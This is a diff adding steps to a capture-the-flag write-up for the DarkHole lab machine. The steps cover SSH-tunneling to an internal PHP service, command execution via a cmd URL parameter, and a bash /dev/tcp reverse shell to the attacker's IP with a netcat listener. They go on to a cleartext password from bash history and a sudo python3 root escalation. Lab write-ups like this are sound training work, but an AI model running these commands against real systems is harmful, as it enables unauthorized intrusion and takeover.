@@ -149,17 +149,59 @@ We checked for bash history of the user:johad:
 
 Here, we saw a bunch of web requests that had been made to this local port and something already running on localhost:port 9999. 
 
-Exposed Internal Web Service on Port 9999
+# Exposed Internal Web Service on Port 9999
 We started looking at the web-related files:
 
-cat /opt/web/index.php 
+    cat /opt/web/index.php 
+
 <img width="610" height="346" alt="image" src="https://github.com/user-attachments/assets/0203e110-7cb2-49b0-bf25-2e8a63e696f4" />
 
 We came across a code in the ‘index.php’ file that would allow us to do remote command execution on the web page url. 
 
-Remote Code Execution via cmd Parameter
+# Remote Code Execution via cmd Parameter
 We created a ssh tunnel between our local machine and the remote server.
 
     ssh -L 9999:127.0.0.1:9999 jehad@192.168.139.143 
 
 <img width="785" height="639" alt="image" src="https://github.com/user-attachments/assets/dfc475bd-a2ef-42f4-94ca-49c17ffba8d7" />
+
+Visiting the forwarded port on our local system: 
+
+Knowing that the site accepted GET requests from the ‘index.php’ code, we continued interacting with the current target system by adding a ‘cmd=id’ parameter to the end of the URL.
+
+<img width="716" height="272" alt="image" src="https://github.com/user-attachments/assets/104894d1-b40b-44dd-a93e-57050c0bfebc" />
+
+# Reverse Shell Execution via RCE
+
+To get a reverse shell as this user so started listening on port 9001 on our local system:
+
+    nc -nlvp 9001
+
+We used the following payload for the reverse shell:
+
+    bash -c 'bash -i >& /dev/tcp/192.168.139.139/9001 0>&1’
+
+<img width="733" height="527" alt="image" src="https://github.com/user-attachments/assets/1236e50c-03be-4be2-b16e-72709ee23521" />
+
+# Privilege Escalation
+
+We checked bash history has a password of the user losy : 
+
+    cat ~/.bash_history 
+
+Which showed us password in clear test : gang
+
+# Privilege Escalation via sudo python3
+
+    script -qc "sudo python3 -c 'import os; os.system(\"/bin/bash\")'" 
+
+<img width="973" height="401" alt="image" src="https://github.com/user-attachments/assets/c597b765-83fd-4aeb-9a0a-17ed9d0592d0" />
+
+# Captured the Flag
+
+Flag Disclosure due to Weak File Permissions
+
+cat root.txt
+
+<img width="805" height="458" alt="image" src="https://github.com/user-attachments/assets/992e4562-ba49-4545-a4d1-8d84ad3ac940" />
+Captured the flag: DarkHole{'Legend'}
